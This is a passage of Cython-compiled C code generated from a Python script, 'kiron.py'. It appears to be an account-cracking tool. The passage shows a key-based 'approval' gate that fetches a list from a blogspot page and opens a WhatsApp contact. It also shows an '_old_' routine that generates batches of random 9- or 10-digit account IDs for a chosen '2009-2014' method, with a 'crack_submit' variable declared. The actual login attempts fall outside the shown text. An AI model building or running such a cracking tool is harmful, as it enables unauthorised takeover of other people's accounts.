        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_int_2};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 170, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":171
 *         input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
 *         time.sleep(2)
 *         tks = sexkey             # <<<<<<<<<<<<<<
 *         os.system('xdg-open https://wa.me/+8801909765573')
 * #__________________| LOGO |__________________#
 */
    __Pyx_INCREF(__pyx_v_sexkey);
    __pyx_v_tks = __pyx_v_sexkey;

    /* "kiron.py":172
 *         time.sleep(2)
 *         tks = sexkey
 *         os.system('xdg-open https://wa.me/+8801909765573')             # <<<<<<<<<<<<<<
 * #__________________| LOGO |__________________#
 * logo=(f"""
 */
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 172, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_kp_s_xdg_open_https_wa_me_88019097655};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 172, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __pyx_L3:;

  /* "kiron.py":158
 * import os,httpx
 * sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 * def approval():             # <<<<<<<<<<<<<<
 *     sexkey = "XD~["+str(os.getuid())+"4YYU8"+str(os.getuid())+"]~XD"
 *     ress=httpx.get("https://fgsrsvb.blogspot.com/2024/05/approvetxt.html").text
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("kiron.approval", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_sexkey);
  __Pyx_XDECREF(__pyx_v_ress);
  __Pyx_XDECREF(__pyx_v_tks);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":187
 * """)
 * #-----------------------[ OLD-CODE ]-----------------------#
 * def _old_():             # <<<<<<<<<<<<<<
 *        user=[]
 *        clear()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_15_old_(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_15_old_ = {"_old_", (PyCFunction)__pyx_pw_5kiron_15_old_, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_15_old_(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("_old_ (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_14_old_(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_14_old_(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_star = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_crack_submit = NULL;
  PyObject *__pyx_v_mal = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  int __pyx_t_6;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  Py_UCS4 __pyx_t_16;
  PyObject *__pyx_t_17 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("_old_", 1);

  /* "kiron.py":188
 * #-----------------------[ OLD-CODE ]-----------------------#
 * def _old_():
 *        user=[]             # <<<<<<<<<<<<<<
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
 */
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 188, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_user = ((PyObject*)__pyx_t_1);
  __pyx_t_1 = 0;

  /* "kiron.py":189
 * def _old_():
 *        user=[]
 *        clear()             # <<<<<<<<<<<<<<
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 189, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":190
 *        user=[]
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()             # <<<<<<<<<<<<<<
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        clear()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 190, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 190, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":191
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")             # <<<<<<<<<<<<<<
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 191, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_limit = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":192
 *        print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999');linex()
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        clear()             # <<<<<<<<<<<<<<
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')
 *        linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 192, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":193
 *        limit=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')             # <<<<<<<<<<<<<<
 *        linex()
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 193, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":194
 *        clear()
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')
 *        linex()             # <<<<<<<<<<<<<<
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        if ask in["1"]:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 194, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 194, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":195
 *        print(f'\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m] \x1b[38;5;46mMETHOD \x1b[38;5;244m[\x1b[38;5;46m2009-2014\x1b[38;5;244m] \x1b[38;5;46m')
 *        linex()
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")             # <<<<<<<<<<<<<<
 *        if ask in["1"]:
 *           star="10000"
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 195, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_ask = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":196
 *        linex()
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        if ask in["1"]:             # <<<<<<<<<<<<<<
 *           star="10000"
 *           for i in range(int(limit)):
 */
  __Pyx_INCREF(__pyx_v_ask);
  __pyx_t_1 = __pyx_v_ask;
  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 196, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_6 = __pyx_t_5;
  if (__pyx_t_6) {

    /* "kiron.py":197
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        if ask in["1"]:
 *           star="10000"             # <<<<<<<<<<<<<<
 *           for i in range(int(limit)):
 *               data=str(random.choice(range(1000000000,9999999999)))
 */
    __Pyx_INCREF(__pyx_kp_s_10000);
    __pyx_v_star = __pyx_kp_s_10000;

    /* "kiron.py":198
 *        if ask in["1"]:
 *           star="10000"
 *           for i in range(int(limit)):             # <<<<<<<<<<<<<<
 *               data=str(random.choice(range(1000000000,9999999999)))
 *               user.append(data)
 */
    __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_v_limit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 198, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 198, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
      __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1);
      __pyx_t_7 = 0;
      __pyx_t_8 = NULL;
    } else {
      __pyx_t_7 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 198, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_8 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 198, __pyx_L1_error)
    }
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    for (;;) {
      if (likely(!__pyx_t_8)) {
        if (likely(PyList_CheckExact(__pyx_t_1))) {
          {
            Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
            #if !CYTHON_ASSUME_SAFE_MACROS
            if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 198, __pyx_L1_error)
            #endif
            if (__pyx_t_7 >= __pyx_temp) break;
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_2); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 198, __pyx_L1_error)
          #else
          __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 198, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_2);
          #endif
        } else {
          {
            Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
            #if !CYTHON_ASSUME_SAFE_MACROS
            if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 198, __pyx_L1_error)
            #endif
            if (__pyx_t_7 >= __pyx_temp) break;
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_2); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 198, __pyx_L1_error)
          #else
          __pyx_t_2 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 198, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_2);
          #endif
        }
      } else {
        __pyx_t_2 = __pyx_t_8(__pyx_t_1);
        if (unlikely(!__pyx_t_2)) {
          PyObject* exc_type = PyErr_Occurred();
          if (exc_type) {
            if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
            else __PYX_ERR(0, 198, __pyx_L1_error)
          }
          break;
        }
        __Pyx_GOTREF(__pyx_t_2);
      }
      __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_2);
      __pyx_t_2 = 0;

      /* "kiron.py":199
 *           star="10000"
 *           for i in range(int(limit)):
 *               data=str(random.choice(range(1000000000,9999999999)))             # <<<<<<<<<<<<<<
 *               user.append(data)
 *        else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_range, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_10 = NULL;
      __pyx_t_4 = 0;
      #if CYTHON_UNPACK_METHODS
      if (unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
          __pyx_t_4 = 1;
        }
      }
      #endif
      {
        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_t_3};
        __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 199, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      }
      __pyx_t_9 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 199, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF_SET(__pyx_v_data, __pyx_t_9);
      __pyx_t_9 = 0;

      /* "kiron.py":200
 *           for i in range(int(limit)):
 *               data=str(random.choice(range(1000000000,9999999999)))
 *               user.append(data)             # <<<<<<<<<<<<<<
 *        else:
 *         star="100000"
 */
      __pyx_t_11 = __Pyx_PyList_Append(__pyx_v_user, __pyx_v_data); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 200, __pyx_L1_error)

      /* "kiron.py":198
 *        if ask in["1"]:
 *           star="10000"
 *           for i in range(int(limit)):             # <<<<<<<<<<<<<<
 *               data=str(random.choice(range(1000000000,9999999999)))
 *               user.append(data)
 */
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":196
 *        linex()
 *        ask=input(f"\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m]\x1b[38;5;46m \x1b[38;5;46mINPUT : ")
 *        if ask in["1"]:             # <<<<<<<<<<<<<<
 *           star="10000"
 *           for i in range(int(limit)):
 */
    goto __pyx_L3;
  }

  /* "kiron.py":202
 *               user.append(data)
 *        else:
 *         star="100000"             # <<<<<<<<<<<<<<
 *         for i in range(int(limit)):
 *             data=str(random.choice(range(100000000,999999999)))
 */
  /*else*/ {
    __Pyx_INCREF(__pyx_kp_s_100000);
    __pyx_v_star = __pyx_kp_s_100000;

    /* "kiron.py":203
 *        else:
 *         star="100000"
 *         for i in range(int(limit)):             # <<<<<<<<<<<<<<
 *             data=str(random.choice(range(100000000,999999999)))
 *             user.append(data)
 */
    __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_v_limit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 203, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 203, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_9);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (likely(PyList_CheckExact(__pyx_t_9)) || PyTuple_CheckExact(__pyx_t_9)) {
      __pyx_t_1 = __pyx_t_9; __Pyx_INCREF(__pyx_t_1);
      __pyx_t_7 = 0;
      __pyx_t_8 = NULL;
    } else {
      __pyx_t_7 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 203, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_8 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 203, __pyx_L1_error)
    }
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
    for (;;) {
      if (likely(!__pyx_t_8)) {
        if (likely(PyList_CheckExact(__pyx_t_1))) {
          {
            Py_ssize_t __pyx_temp = __Pyx_PyList_GET_SIZE(__pyx_t_1);
            #if !CYTHON_ASSUME_SAFE_MACROS
            if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 203, __pyx_L1_error)
            #endif
            if (__pyx_t_7 >= __pyx_temp) break;
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_9 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_9); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 203, __pyx_L1_error)
          #else
          __pyx_t_9 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 203, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          #endif
        } else {
          {
            Py_ssize_t __pyx_temp = __Pyx_PyTuple_GET_SIZE(__pyx_t_1);
            #if !CYTHON_ASSUME_SAFE_MACROS
            if (unlikely((__pyx_temp < 0))) __PYX_ERR(0, 203, __pyx_L1_error)
            #endif
            if (__pyx_t_7 >= __pyx_temp) break;
          }
          #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
          __pyx_t_9 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_7); __Pyx_INCREF(__pyx_t_9); __pyx_t_7++; if (unlikely((0 < 0))) __PYX_ERR(0, 203, __pyx_L1_error)
          #else
          __pyx_t_9 = __Pyx_PySequence_ITEM(__pyx_t_1, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 203, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_9);
          #endif
        }
      } else {
        __pyx_t_9 = __pyx_t_8(__pyx_t_1);
